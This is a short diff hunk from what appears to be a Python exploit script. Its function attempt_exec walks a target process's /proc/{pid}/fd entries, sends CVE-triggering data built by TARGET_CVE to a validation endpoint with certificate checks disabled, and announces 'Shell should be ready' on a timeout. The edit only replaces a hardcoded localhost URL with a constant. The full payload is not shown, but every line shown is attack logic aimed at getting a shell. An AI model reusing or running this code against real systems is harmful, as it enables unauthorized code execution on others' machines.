@@ -94,7 +94,7 @@ def attempt_exec(pid: int, botom_fd: int = 20, top_fd: int = 40):
             return
         data = TARGET_CVE(pid, fd)
         try:
-            response = requests.post("https://localhost:8444/validate", data=data, headers=headers, verify=False, timeout=5)
+            response = requests.post(VALIDATOR_URL, data=data, headers=headers, verify=False, timeout=5)
             print(f'Trying /proc/{pid}/fd/{fd} -> rc {response.status_code}')
         except requests.Timeout:
             print('Shell should be ready -- closing threads')
